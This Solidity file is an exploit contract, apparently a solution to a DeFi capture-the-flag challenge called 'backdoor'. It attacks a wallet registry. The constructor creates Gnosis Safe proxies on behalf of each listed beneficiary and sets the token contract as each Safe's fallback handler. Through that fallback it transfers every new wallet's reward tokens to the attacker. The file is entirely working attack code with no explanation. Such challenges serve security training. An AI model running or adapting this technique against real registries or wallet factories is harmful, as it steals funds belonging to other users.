// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../backdoor/WalletRegistry.sol";
// import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

interface IGnosisSafe {
  function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
  ) external;
}

contract BackdoorAttack {
  constructor (
    address registry,
    address masterCopy,
    GnosisSafeProxyFactory walletFactory,
    IERC20 token,
    address[] memory beneficiaries
  ) {
    for (uint i = 0; i < beneficiaries.length; i++) {
      address beneficiary = beneficiaries[i];
      address[] memory owners = new address[](1);
      owners[0] = beneficiary;

      bytes memory initializer = abi.encodeWithSelector(
          IGnosisSafe.setup.selector,
          owners,
          1,
          address(0),
          hex"00",
          address(token),
          address(0),
          0,
          address(0x0)
      );

      GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
        masterCopy, 
        initializer,
        0, 
        WalletRegistry(registry)
      );
      address wallet = address(proxy);
      IERC20(wallet).transfer(msg.sender, token.balanceOf(wallet));
    }
  }
}